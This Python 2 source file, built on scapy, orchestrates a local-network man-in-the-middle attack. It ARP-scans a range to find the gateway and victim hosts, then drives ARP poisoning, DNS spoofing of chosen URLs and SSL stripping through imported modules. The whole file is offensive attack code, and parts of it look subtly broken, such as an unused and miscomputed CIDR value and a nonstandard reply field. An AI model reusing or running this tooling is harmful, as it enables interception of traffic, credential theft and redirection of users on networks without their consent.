from scapy.all import *

from arp_poisoning import ArpPoisoner
from dns_poisoning import DnsPoisoner
from ssl_stripping import SslRemover


class Host():

    def __init__(self, ip, mac, interface, dns_queue_num):

        self.ip           = ip
        self.mac          = mac
        self.is_gateway   = ip[-2:] == ".1"
        self.arp_poisoner = ArpPoisoner(interface)
        self.dns_poisoner = DnsPoisoner(ip, dns_queue_num)
        self.ssl_remover  = SslRemover(dns_queue_num + 1)

    def arp_oneway(self, other_ip, other_mac):

        self.arp_poisoner.add_packet(other_mac, self.mac, other_ip, self.ip)

    def arp_mitm(self, other_ip, other_mac):

        self.arp_poisoner.add_packet(other_mac, self.mac, other_ip, self.ip)
        self.arp_poisoner.add_packet(self.mac, other_mac, self.ip, other_ip)

    def arp_start(self):

        self.arp_poisoner.start()

    def arp_stop(self):

        self.arp_poisoner.stop()

    def dns_add(self, url, ip):

        self.dns_poisoner.add_url(url, ip)

    def dns_start(self):

        self.dns_poisoner.start()

    def dns_stop(self):

        self.dns_poisoner.stop()


def get_hosts(interface, range_, timeout):

    if range_.count('.') > 4:
        range_ = range_.split('/')
        range_cidr = [str(bin(int(x))) for x in range_[1].split('.')].count('1')
        range_ = '/'.join(range_)

    gateway = None
    hosts   = []
    packet  = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=range_)

    for (request, reply) in srp(packet, timeout=timeout, iface=interface, verbose=2)[0]:

        print "request"
        print "reply"

        if reply.psrc[-2:] == ".1":
            gateway = Host(reply.psrc, reply.mac, interface, 0)
        else:
            hosts.append(Host(reply.psrc, reply.mac, interface, 2*(len(hosts) + 1) ))

    return gateway, hosts
